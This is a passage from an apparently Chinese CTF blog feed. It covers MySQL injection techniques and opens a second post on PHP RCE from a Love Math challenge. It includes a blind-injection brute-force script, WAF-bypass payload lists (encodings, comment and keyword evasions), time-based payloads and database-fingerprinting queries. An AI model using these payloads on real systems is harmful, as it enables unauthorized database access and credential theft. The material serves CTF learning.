class="hljs-comment">#结果:1</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#爆第二个字段</span><br><span class="hljs-comment">#结果:guest</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#爆第三个字段</span><br><span class="hljs-comment">#结果:123456</span><br><span class="hljs-comment">#因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母</span><br><span class="hljs-comment">#但是这仅限最后一个字段</span><br><span class="hljs-comment">#所以正确结果是we1c0mehacker </span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><br>res=requests.post(url=url,data=payload)<br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(res.text[-<span class="hljs-number">20</span>:])<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;emmmmm&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;no&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-comment">#返回假时表示上一个字母即为正确结果</span><br>result+=dic[j-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><blockquote><p>注意往前回溯</p><p>mysql比较，从第一个字符还是比较ascii的大小，一次往后 ,并且多列的比较时从第一列的第一位开始的</p><p>mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。</p></blockquote><h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;$log&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;testsetset&#x27;</span><span class="hljs-keyword">or</span> sleep(<span class="hljs-number">5</span>)) # <span class="hljs-string">&#x27;);</span><br><span class="hljs-string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>if((<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>),sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)) # <span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>可以利用联合注入代替order by</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg" alt="image-20220707223820177"></p><h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p><blockquote><p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p><p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg" alt="image-20220708192908674"></p></blockquote><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">/**/替代空格<br><span class="hljs-meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0a 新建一行</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0c 新的一页</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0d <span class="hljs-built_in">return</span> 功能</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a0 空格</span><br>() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。<br></code></pre></td></tr></table></figure><blockquote><p>%a0是一个不成汉字的中文字符，因此正则匹配时不会当空格过滤，而进入sql语句后，mysql不认中文字符，当空格处理</p></blockquote><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>转义符号及注释没被过滤时，将username闭合的单引号转义，在password的输入中插入布尔盲注语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin\<br>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; or 2&gt;1#&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="多种注释符"><a href="#多种注释符" class="headerlink" title="多种注释符"></a>多种注释符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-comment">--%20</span><br><span class="hljs-comment">/**/</span><br>#<br><span class="hljs-comment">--+</span><br><span class="hljs-comment">-- -</span><br><span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;<br>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;\x00<br></code></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><ul><li><p>大小写绕过</p></li><li><p>双写绕过（主要用于源码中使用replace替换黑名单）</p></li><li><p>编码绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br><br>十六进制编码<br><br><span class="hljs-keyword">SELECT</span>(extractvalue(<span class="hljs-number">0x3C613E61646D696E3C2F613E</span>,<span class="hljs-number">0x2f61</span>))<br><br>双重编码绕过<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a <span class="hljs-operator">/</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,password<span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span>Users<span class="hljs-comment">--+</span><br><br>一些unicode编码举例：    <br>单引号：<span class="hljs-string">&#x27;</span><br><span class="hljs-string">%u0027 %u02b9 %u02bc</span><br><span class="hljs-string">%u02c8 %u2032</span><br><span class="hljs-string">%uff07 %c0%27</span><br><span class="hljs-string">%c0%a7 %e0%80%a7</span><br><span class="hljs-string">空白：</span><br><span class="hljs-string">%u0020 %uff00</span><br><span class="hljs-string">%c0%20 %c0%a0 %e0%80%a0</span><br><span class="hljs-string">左括号(:</span><br><span class="hljs-string">%u0028 %uff08</span><br><span class="hljs-string">%c0%28 %c0%a8</span><br><span class="hljs-string">%e0%80%a8</span><br><span class="hljs-string">右括号):</span><br><span class="hljs-string">%u0029 %uff09</span><br><span class="hljs-string">%c0%29 %c0%a9</span><br><span class="hljs-string">%e0%80%a9</span><br></code></pre></td></tr></table></figure></li><li><p>like绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br>可绕过对<span class="hljs-operator">=</span> <span class="hljs-operator">&gt;</span>等过滤<br></code></pre></td></tr></table></figure></li><li><p>in绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;1234&#x27;</span>)#<br></code></pre></td></tr></table></figure><blockquote><p>in可以代替’&#x3D;’，只有两个字符串一模一样时才返回true，注意括号不能漏，否则报错</p></blockquote></li><li><p>过滤union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union&#x27;</span><br>绕过方式 <span class="hljs-number">1</span><span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤where</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="hljs-number">1</span>的<span class="hljs-keyword">user</span>为admim<br></code></pre></td></tr></table></figure></li><li><p>过滤group by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>过滤select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select&#x27;</span><br>只能查询本表中的数据<br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote></li><li><p>过滤’(单引号)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></code></pre></td></tr></table></figure></li><li><p>过滤hex</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></code></pre></td></tr></table></figure></li><li><p>过滤substr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-operator">|</span>substr<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="hljs-string">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>过滤了逗号怎么办？就不能多个参数了吗？<br><span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>);与<span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-number">6</span> <span class="hljs-keyword">FOR</span> <span class="hljs-number">5</span>);<br>意思相同<br>substr支持这样的语法：<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos <span class="hljs-keyword">FOR</span> len)<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos)<br>MID()后续加入了这种写法<br></code></pre></td></tr></table></figure></li></ul><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br> <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span> pwd <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br> <br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `version()`  可以用来过空格和正则，特殊情况下还可以当作注释符用<br></code></pre></td></tr></table></figure><h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h3 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h3><p>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，<a href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020">PostgreSQL</a><br>java：Oracle，MySQL</p><h2 id="根据特有函数判断"><a href="#根据特有函数判断" class="headerlink" title="根据特有函数判断"></a>根据特有函数判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p><code>len()</code>：SQL Server 、MySQL以及db2返回长度的函数。<br><code>length()</code>：Oracle和INFORMIX返回长度的函数。</p><h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><code>version()</code>：MySQL查询版本信息的函数<br><code>@@version</code>：MySQL和SQL Server查询版本信息的函数</p><h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p><h3 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h3><p>&#x2F;*是MySQL数据库的注释符<br>–是Oracle和SQL Server支持的注释符<br>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外MySQL也支持– 和&#x2F;**&#x2F;</p><h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>MySQL<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>Oracle<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’||’b’&#x3D;’ab’<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>SQL Server<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’ </p><h3 id="根据数据库特有的数据表来判断"><a href="#根据数据库特有的数据表来判断" class="headerlink" title="根据数据库特有的数据表来判断"></a>根据数据库特有的数据表来判断</h3><p>MySQL（version&gt;5.0）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from information_schema.TABLES)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Oracle</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sysobjects)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="根据盲注特别函数判断"><a href="#根据盲注特别函数判断" class="headerlink" title="根据盲注特别函数判断"></a>根据盲注特别函数判断</h3><p>MySQL</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">BENCHMARK</span><span class="hljs-params">(<span class="hljs-number">1000000</span>,ENCODE(<span class="hljs-string">&#x27;QWE&#x27;</span>,<span class="hljs-string">&#x27;ASD&#x27;</span>)</span></span>)<br><span class="hljs-function"><span class="hljs-title">SLEEP</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br></code></pre></td></tr></table></figure><p>PostgreSQL</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PG_SLEEP(<span class="hljs-number">5</span>)<br>GENERATE_SERIES(<span class="hljs-number">1</span>,<span class="hljs-number">1000000</span>)<br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WAITFOR</span> DELAY &#x27;<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>&#x27;<br></code></pre></td></tr></table></figure><p>⚠️待补充 <a href="https://www.freebuf.com/articles/web/261524.html">珂技系列之一篇就够了——mysql注入 - FreeBuf网络安全行业门户</a></p><p>[对MYSQL注入相关内容及部分Trick的归类小结 - 先知社区 (aliyun.com)](</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php利用math函数rce相关思考与理解</title>
      <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="php利用math函数rce相关思考与理解"><a href="#php利用math函数rce相关思考与理解" class="headerlink" title="php利用math函数rce相关思考与理解"></a>php利用math函数rce相关思考与理解</h1><h2 id="0x00题目背景"><a href="#0x00题目背景" class="headerlink" title="0x00题目背景"></a>0x00题目背景</h2><p>来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同</p><h3 id="相关过滤"><a href="#相关过滤" class="headerlink" title="相关过滤"></a>相关过滤</h3><p>长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">60</span>) &#123;<span class="hljs-comment">//国赛限制80</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>黑名单特殊字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span 